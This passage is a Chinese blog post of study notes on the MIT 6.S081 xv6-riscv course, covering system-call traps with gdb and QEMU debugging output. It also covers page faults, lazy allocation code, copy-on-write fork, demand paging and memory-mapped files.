id="chapter6">Chapter6</h1><blockquote><p>导读：阅读【1】中第4章，除了4.6；阅读RISCV.h【2】；阅读trampoline.S【3】；阅读trap.c【4】</p><p>【1】https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf</p><p>【2】https://github.com/mit-pdos/xv6-riscv/blob/riscv/kernel/riscv.h</p><p>【3】https://github.com/mit-pdos/xv6-riscv/blob/riscv/kernel/trampoline.S</p><p>【4】https://github.com/mit-pdos/xv6-riscv/blob/riscv/kernel/trap.c</p></blockquote><p>RISC-V总共有32个比如a0，a1这样的寄存器，用户应用程序可以使用全部的寄存器。</p><p>一些重要的寄存器介绍：</p><ul><li><code>stvec</code>：内核在这里写入其陷阱处理程序的地址；RISC-V跳转到这里处理陷阱。</li><li><code>sepc</code>：当发生陷阱时，RISC-V会在这里保存程序计数器<code>pc</code>（因为<code>pc</code>会被<code>stvec</code>覆盖）。<code>sret</code>（从陷阱返回）指令会将<code>sepc</code>复制到<code>pc</code>。内核可以写入<code>sepc</code>来控制<code>sret</code>的去向。</li><li><code>scause</code>： RISC-V在这里放置一个描述陷阱原因的数字。</li><li><code>sscratch</code>：内核在这里放置了一个值，这个值在陷阱处理程序一开始就会派上用场。</li><li><code>sstatus</code>：其中的<strong>SIE</strong>位控制设备中断是否启用。如果内核清空<strong>SIE</strong>，RISC-V将推迟设备中断，直到内核重新设置<strong>SIE</strong>。<strong>SPP</strong>位指示陷阱是来自用户模式还是管理模式，并控制<code>sret</code>返回的模式。</li></ul><h2 id="trap的执行流程">trap的执行流程</h2><p>这里使用write来举例，ecall执行系统调用，ecall后会切换到内核，内核中执行的第一个指令是一个由汇编语言写的函数，叫做<code>uservec</code>（<code>trampoline.s</code>），执行完后会跳到<code>usertrap</code>(<code>trap.c</code>)，<code>usertrap</code>中会执行<code>syscall</code>，<code>syscall</code>会在一个表单中，根据传入的代表系统调用的数字进行查找，并在内核中执行具体实现了系统调用功能的函数。</p><p>之后会输出内容到终端，完成后返回到<code>syscall</code>，再之后回复user空间代码，<code>syscall</code>中调用了<code>usertrapret</code>(<code>trap.c</code>)，<code>usertrapret</code>完成了部分方便在C代码中实现的返回到用户空间的工作，剩下的一些工作由汇编完成，即<code>userret</code>（<code>trampoline.s</code>），完成后会返回到用户空间继续执行用户代码。</p><blockquote><p>vm.c运行在kernel mode下。</p></blockquote><h2 id="ecall指令之前状态">ECALL指令之前状态</h2><p><code>sh.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getcmd</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> nbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// fprintf(2, &quot;$ &quot;);</span></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;$&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, nbuf);</span><br><span class="line">  gets(buf, nbuf);</span><br><span class="line">  <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="number">0</span>) <span class="comment">// EOF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write系统调用，它将“$ ”写入到文件描述符2.</p><p>用户代码的Shell调用write时，实际上调用的是关联到Shell的一个库函数。在usys.s。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write:</span><br><span class="line"> li a7, SYS_write</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure><p>看下<code>sh.asm</code>,，找到ecall的指令的地址，下断点：是0xdee</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000000dea &lt;write&gt;:</span><br><span class="line">.global write</span><br><span class="line">write:</span><br><span class="line"> li a7, SYS_write</span><br><span class="line">     dea:48c1                lia7,16</span><br><span class="line"> ecall</span><br><span class="line">     dec:00000073          ecall</span><br><span class="line"> ret</span><br><span class="line">     df0:8082                ret</span><br></pre></td></tr></table></figure><p>下断点：可以看下PC寄存器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0xdec</span><br><span class="line">Breakpoint 1 at 0xdee</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[Switching to Thread 1.2]</span><br><span class="line"></span><br><span class="line">Thread 2 hit Breakpoint 1, 0x0000000000000dee <span class="keyword">in</span> ?? ()</span><br><span class="line">=&gt; 0x0000000000000dec:73 00 00 00ecall</span><br><span class="line">(gdb) <span class="built_in">print</span> <span class="variable">$pc</span></span><br><span class="line"><span class="variable">$1</span> = (void (*)()) 0xdec</span><br></pre></td></tr></table></figure><p>还可以<code>info reg</code>打印全部寄存器（user）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info reg</span><br><span class="line">ra             0xe8c    0xe8c</span><br><span class="line">sp             0x3e90   0x3e90</span><br><span class="line">gp             0x505050505050505        0x505050505050505</span><br><span class="line">tp             0x505050505050505        0x505050505050505</span><br><span class="line">t0             0x505050505050505        361700864190383365</span><br><span class="line">t1             0x505050505050505        361700864190383365</span><br><span class="line">t2             0x505050505050505        361700864190383365</span><br><span class="line">fp             0x3eb0   0x3eb0</span><br><span class="line">s1             0x12f1   4849</span><br><span class="line">a0             0x1      1</span><br><span class="line">a1             0x3e9f   16031</span><br><span class="line">a2             0x1      1</span><br><span class="line">a3             0x505050505050505        361700864190383365</span><br><span class="line">a4             0x505050505050505        361700864190383365</span><br><span class="line">a5             0x24     36</span><br><span class="line">a6             0x505050505050505        361700864190383365</span><br><span class="line">a7             0x10     16</span><br><span class="line">s2             0x24     36</span><br><span class="line">s3             0x0      0</span><br><span class="line">s4             0x25     37</span><br><span class="line">s5             0x2      2</span><br><span class="line">s6             0x3f50   16208</span><br><span class="line">s7             0x1438   5176</span><br><span class="line">s8             0x64     100</span><br></pre></td></tr></table></figure><p>a0，a1，a2是Shell传递给write系统调用的参数。所以a0是文件描述符2；a1是Shell想要写入字符串的指针；a2是想要写入的字符数。可以打印shell想要写入的字符串：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/2c <span class="variable">$a1</span></span><br><span class="line">0x12f0:36 <span class="string">&#x27;$&#x27;</span>0 <span class="string">&#x27;\000&#x27;</span></span><br></pre></td></tr></table></figure><p>系统调用是会有大量状态的变更，其中一个最重要的需要变更的状态，并且在它变更之前我们对它还有依赖的，就是是当前的<code>page table</code>。我们可以查看SATP寄存器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">print</span>/x <span class="variable">$satp</span></span><br><span class="line"><span class="variable">$3</span> = 0x8000000000087f63</span><br></pre></td></tr></table></figure><p>这里输出的是物理地址，page table的映射关系，QEMU可以打印：在qemu界面，ctrl a+c 进到qemu的console，输入<code>info mem</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(qemu) info mem</span><br><span class="line">vaddr            paddr            size             attr</span><br><span class="line">---------------- ---------------- ---------------- -------</span><br><span class="line">0000000000000000 0000000087f60000 0000000000001000 rwxu-a-</span><br><span class="line">0000000000001000 0000000087f5d000 0000000000001000 rwxu-a-</span><br><span class="line">0000000000002000 0000000087f5c000 0000000000001000 rwx----</span><br><span class="line">0000000000003000 0000000087f5b000 0000000000001000 rwxu-ad</span><br><span class="line">0000003fffffe000 0000000087f6f000 0000000000001000 rw---ad</span><br><span class="line">0000003ffffff000 0000000080007000 0000000000001000 r-x--a-</span><br></pre></td></tr></table></figure><p>attr这一列是PTE的标志位，u标志位（rwx后），它表明PTE_u标志位是否被设置，用户代码只能访问u标志位设置了的PTE。再下一个标志位是a（Accessed），表明这条PTE是不是被使用过。再下一个标志位d（Dirty）表明这条PTE是不是被写过。</p><p>最后两条PTE的虚拟地址非常大，非常接近虚拟地址的顶端，这两个page分别是<code>trapframe page</code>和<code>trampoline page</code>，都没有设置u标志，所以用户代码不能访问这两条PTE。一旦我们进入到了supervisor mode，就可以访问这两条PTE了。</p><h2 id="ecall指令之后状态">ECALL指令之后状态</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/3i 0xdee</span><br><span class="line">=&gt; 0xdee:ecall</span><br><span class="line">   0xdf2:ret</span><br><span class="line">   0xdf4:lia7,21</span><br><span class="line">(gdb) stepi</span><br><span class="line">0x0000000000000df2 <span class="keyword">in</span> ?? ()</span><br><span class="line">=&gt; 0x0000000000000df2:82 80ret</span><br></pre></td></tr></table></figure><p>能看出这里其实没进内核，，，试了好几次也不知道为啥，，</p><p>正常情况下，进去之后直接就到高地址了，，，，PC寄存器可以看到。（下面就按照假设进去之后</p><p>PC在<code>trampoline page</code>的最开始，要进行的指令是内核在<code>supervisor mode</code>中将要执行的最开始的几条指令，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># swap a0 and sscratch</span><br><span class="line"># so that a0 is TRAPFRAME</span><br><span class="line">csrrw a0, sscratch, a0</span><br><span class="line"># save the user registers in TRAPFRAME</span><br><span class="line">sd ra, 40(a0)</span><br><span class="line">sd sp, 48(a0)</span><br><span class="line">sd gp, 56(a0)</span><br><span class="line">sd tp, 64(a0)</span><br><span class="line">sd t0, 72(a0)</span><br><span class="line">........</span><br></pre></td></tr></table></figure><p><code>csrrw</code>指令交换了寄存器<code>a0</code>和<code>sscratch</code>的内容</p><p>现在在这个地址<code>0x3ffffff000</code>，也就是上面page table输出的最后一个page，<code>trampoline page</code>，这个page包含了内核的trap处理代码。ecall并不会切换page table。</p><h1 id="chapter8">Chapter8</h1><h2 id="page-fault-basics">page fault basics</h2><p>这章内容是<code>page fault</code>，以及通过<code>page fault</code>可以实现的一系列虚拟内存功能。XV6中没有实现<code>page fault</code></p><p>下一个实验<code>lazy lab</code></p><p>虚拟内存的两个主要优点：</p><ul><li>隔离性</li><li>另一个好处是<code>level of indirection</code>，提供了一层抽象。处理器和所有的指令都可以使用虚拟地址，而内核会定义从虚拟地址到物理地址的映射关系。</li></ul><p>以上介绍的内存地址映射都相对静止，就是分配好就不动了。</p><p>下面介绍的<code>page fault</code>使这种映射变得动态起来。</p><p>通过page fault，内核可以更新page table。</p><p>什么样的信息是<code>page fault</code>必须得，或者说内核需要什么样的信息才能响应<code>page fault</code>？</p><ul><li>出错的虚拟地址</li><li>出错的原因</li><li>触发page fault的指令的地址：存放在SEPC（Supervisor Exception Program Counter）寄存器中，并同时会保存在trapframe-&gt;epc</li></ul><p>所以说有价值的信息为：引起page fault的内存地址、原因类型、程序计数器值。</p><h2 id="lazy-page-allocation">lazy page allocation</h2><p>这小结讲的是Allocate，或者说是<code>sbrk</code>，sbrk是xv6的系统调用，用于增大heap，这里xv6的heap在stack的上面，即高地址，最起码ppt是这样显示的。</p><p>那么最开始的时候sbrk指向heap的底端，也就是stack的顶端，用sz字段表示，这里以<code>p-&gt;sz</code>表示。</p><p>这意味着，当sbrk实际发生或者被调用的时候，内核会分配一些物理内存，并将这些内存映射到用户应用程序的地址空间，然后将内存内容初始化为0，再返回sbrk系统调用。当然参数可正可负，本节只关注增加内存的情况。</p><p>sbrk的系统调用做的事情就是提升<code>p-&gt;sz</code>，加n，n是需要的page数。之后要将新的内存映射到page table。</p><p>改下sbrk的调用的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sbrk</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> addr;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">addr = myproc()-&gt;sz;</span><br><span class="line">myproc()-&gt;sz = myproc()-&gt;sz + n;</span><br><span class="line"><span class="comment">// if (growproc(n) &lt; 0)</span></span><br><span class="line"><span class="comment">//   return -1;</span></span><br><span class="line"><span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后echo下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hi</span><br><span class="line">usertrap(): unexpected scause 0x000000000000000f pid=3</span><br><span class="line">            sepc=0x00000000000012ac stval=0x0000000000004008</span><br><span class="line">panic: uvmunmap: not mapped</span><br></pre></td></tr></table></figure><p>输出了：</p><ul><li>SCAUSE寄存器内容：表明这是一个store page fault</li><li>pid</li><li>SEPC寄存器值</li><li>出错的虚拟内存地址，STVAL寄存器：0x4008</li></ul><p>以上是错误信息。我们接下来看看如何能够聪明的处理这里的page fault。</p><p>usertrap:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// handle an interrupt, exception, or system call from user space.</span></span><br><span class="line"><span class="comment">// called from trampoline.S</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usertrap</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r_sstatus() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line"><span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line"><span class="comment">// save user program counter.</span></span><br><span class="line">p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r_scause() == <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;killed)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line"><span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line"><span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">intr_on();</span><br><span class="line"></span><br><span class="line">syscall();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((which_dev = devintr()) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ok</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;killed)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line"><span class="keyword">if</span> (which_dev == <span class="number">2</span>)</span><br><span class="line">yield();</span><br><span class="line"></span><br><span class="line">usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>usertrap</code>根据不同的<code>SCAUSE</code>完成不同操作。</p><p>Chapter6中是SCAUSE == 8时进入的trap，如果SCAUSE不等于8，接下来会检查是否有任何的设备中断，如果有的话处理相关的设备中断。如果两个条件都不满足，这里会打印一些信息，并且杀掉进程。</p><p>增加下scause为15时的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((which_dev = devintr()) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ok</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (r_scause() == <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line">uint64 va = r_stval();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;page fault %p\n&quot;</span>, va);</span><br><span class="line">uint64 ka = (uint64)kalloc();</span><br><span class="line"><span class="keyword">if</span> (ka == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>((<span class="keyword">void</span> *)ka, <span class="number">0</span>, PGSIZE);</span><br><span class="line">va = PGROUNDDOWN(va);</span><br><span class="line"><span class="keyword">if</span> (mappages(p-&gt;pagetable, va, PGSIZE, ka, PTE_W | PTE_U | PTE_R) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">kfree((<span class="keyword">void</span> *)ka);</span><br><span class="line">p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新分配的内存为0表示没物理内存分配了，杀掉进程；有的话，将物理内存page指向用户地址空间中合适的虚拟内存地址。</p><p>具体来说，我们首先将虚拟地址向下取整，这里引起page fault的虚拟地址是0x4008，向下取整之后是0x4000。之后我们将物理内存地址跟取整之后的虚拟内存地址的关系加到page table中。对应的PTE需要设置常用的权限标志位。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hi</span><br><span class="line">page fault 0x0000000000004008</span><br><span class="line">page fault 0x0000000000013f48</span><br><span class="line">panic: uvmunmap: not mapped</span><br><span class="line">QEMU: Terminated</span><br></pre></td></tr></table></figure><p>但是并没有正常工作。uvmunmap在报错，它尝试unmap的page并不存在。这里unmap的内存是之前lazy allocation但是又没有实际分配的内存。</p><p>所以对于这个内存，并没有对应的物理内存。所以在uvmunmap函数中，当PTE的v标志位为0并且没有对应的mapping，这并不是一个实际的panic，这是预期的行为，改为continue：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uvmunmap</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 va, uint64 npages, <span class="keyword">int</span> do_free)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint64 a;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((va % PGSIZE) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;uvmunmap: not aligned&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (a = va; a &lt; va + npages * PGSIZE; a += PGSIZE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((pte = walk(pagetable, a, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;uvmunmap: walk&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">// panic(&quot;uvmunmap: not mapped&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (PTE_FLAGS(*pte) == PTE_V)</span><br><span class="line">panic(<span class="string">&quot;uvmunmap: not a leaf&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (do_free)</span><br><span class="line">&#123;</span><br><span class="line">uint64 pa = PTE2PA(*pte);</span><br><span class="line">kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">&#125;</span><br><span class="line">*pte = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就可以直接执行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo hi</span><br><span class="line">page fault <span class="number">0x0000000000004008</span></span><br><span class="line">page fault <span class="number">0x0000000000013f48</span></span><br><span class="line">hi</span><br></pre></td></tr></table></figure><blockquote><p>学生提问：我并不能理解为什么在uvmunmap中可以直接改成continue？</p><p>Frans教授：之前的panic表明，我们尝试在释放一个并没有map的page。怎么会发生这种情况呢？唯一的原因是sbrk增加了p-&gt;sz，但是应用程序还没有使用那部分内存。因为对应的物理内存还没有分配，所以这部分新增加的内存的确没有映射关系。我们现在是lazy allocation，我们只会为需要的内存分配物理内存page。如果我们不需要这部分内存，那么就不会存在map关系，这非常的合理。相应的，我们对于这部分内存也不能释放，因为没有实际的物理内存可以释放，所以这里最好的处理方式就是continue，跳过并处理下一个page。</p><p>学生提问：在uvmunmap中，我认为之前的panic存在是有理由的，我们是不是应该判断一下，然后对于特定的场景还是panic？</p><p>Frans教授：为什么之前的panic会存在？对于未修改的XV6，永远也不会出现用户内存未map的情况，所以一旦出现这种情况需要panic。但是现在我们更改了XV6，所以我们需要去掉这里的panic，因为之前的不可能变成了可能。</p></blockquote><h2 id="zero-fill-on-demand">Zero Fill On Demand</h2><p>这节是基于page fault 和page table可以做的其他酷的事情。</p><p>BSS区域包含了未被初始化或者初始化为0的全局或者静态变量。</p><p>BSS段或许有很多个page，但是所有page都为0，调优的方法：在物理内存中，我只需要分配一个page，这个page的内容全是0，然后将所有虚拟地址空间的全0的page都map到这一个物理page上。这样至少在程序启动的时候能节省大量的物理内存分配。</p><figure><img src="/2022/07/07/6.s081/image-20220720211117628.png" alt="image-20220720211117628"><figcaption aria-hidden="true">image-20220720211117628</figcaption></figure><p>这个PTE是只读的。如果更改BSS的一两个变量的值时，会page fault，解决办法：物理内存申请一个新的page，memset(0)，之后更新这个page的映射关系，这个PTE设置为可读可写。</p><h2 id="copy-on-write-fork">Copy On Write Fork</h2><p>也是一个常见的优化，有时叫COW fork。</p><p>shell处理指令时，会fork子进程，之后exec，现在的情况是，fork创建了Shell地址空间的一个完整的拷贝，而exec做的第一件事情就是丢弃这个地址空间，取而代之的是一个包含了echo的地址空间。这里看起来有点浪费。</p><p>所以对于这个特定场景有一个非常有效的优化：当我们创建子进程时，直接共享父进程的物理内存page。</p><p>这里要小心些，因为隔离性，有些更新对父进程应不可见。</p><p>首先先把父子进程的PTE都设置为只读，之后修改的时候会page fault，分配新的物理page，然后将page fault相关的物理内存page拷贝到新分配的物理内存page中，并将新分配的物理内存page映射到子进程。新分配的物理内存page只对子进程的地址空间可见，设置PTE为可读写，原来page fault的物理page，只对父进程可见，相应的PTE对父进程也为可读写了。</p><p>PTE中有个copy-on-write标志位，RSW。</p><h2 id="demand-paging">Demand Paging</h2><p>也是一个流行的功能。</p><p>exec时os会加载text，data区域，并且以eager的方式将这些区域加载进page table。这里可以在稍后加载进page table。</p><p>so，对于exec，虚拟地址中，为text和data分配好地址段，但是相应的PTE并不对应任何物理内存page。对于这些PTE，只需要将valid bit位设置为0即可。</p><p>应用程序是从地址0开始运行。text区域从地址0开始向上增长。位于地址0的指令是会触发第一个page fault的指令。如何处理？这些page是on-demand page。需要在某个地方记录了这些page对应的程序文件，在page fault handler中需要从程序文件中读取page数据，加载到内存中；之后将内存page映射到page table；最后再重新执行指令，就可以执行了。</p><p>dirty page是曾经被写过的page，而non-dirty page是只被读过，但是没有被写过的page。</p><h2 id="memory-mapped-files">Memory Mapped Files</h2><p>将完整或者部分文件加载到内存中，这样就可以通过内存地址相关的load或者store指令来操纵文件。为了支持这个功能，一个现代的操作系统会提供一个叫做mmap的系统调用。这个系统调用会接收一个虚拟内存地址（VA），长度（len），protection，一些标志位，一个打开文件的文件描述符，和偏移量（offset）。</p><h1 